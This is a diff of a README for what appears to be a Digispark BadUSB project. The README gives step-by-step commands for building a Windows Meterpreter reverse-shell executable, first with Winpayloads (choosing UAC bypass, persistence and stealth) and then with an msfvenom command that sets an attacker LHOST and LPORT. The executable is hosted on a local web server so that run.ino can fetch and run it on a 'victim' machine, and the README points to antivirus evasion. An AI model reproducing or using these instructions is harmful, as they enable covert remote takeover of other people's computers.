@@ -1,5 +1,22 @@
 ## Instructions To Creating the Payload to be executed by run.ino:
-  ### On the host machine (linux): // Note: (change 192.168.0.24 to your ip, and 8080 to the port you desire)
+
+ ### METHOD 1 On the host machine(Linux): Using Winpayloads 
+   ~ https://github.com/nccgroup/Winpayloads/blob/master/README.md ~
+   #### Installation: 
+        1. `git clone https://github.com/nccgroup/Winpayloads.git`  
+        2. `cd Winpayloads`  
+        3. `./setup.sh`
+        
+   #### RUN: 
+        1. `./WinPayLoads.py`
+        2. `2` (to run Windows Meterpreter Reverse Shell [uacbypass, persistence, allchecks]  )
+        3. Enter port and ip or simply press Enter for defaults
+        4. `y` (for UAC Bypass)
+        5. enter victim windows version
+        6. `y` to upload to local webserver
+        7. That's it!! update run.ino with the url to the executable eg: http://192.168.0.24:8000/fgxjdqzp.exe, then compile and load to your digispark
+
+  ### On the host machine (linux): // if above method doesn't work. (note: change 192.168.0.24 to your ip, and 8080 to the port you desire)
    1.  msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows LHOST=192.168.0.24 LPORT=8080 -f exe > shell.exe   
    2.  cp shell.exe /var/www/html
    3.  *OPTIONAL* go to Avoiding AntiVirus
@@ -19,6 +36,4 @@
     5. Y (to enter stealth mode)
     6. Enter LHOST and LPORT
     
-    
-   ### Using Winpayloads (if the above method fails)
-    1. https://github.com/nccgroup/Winpayloads/blob/master/README.md
+
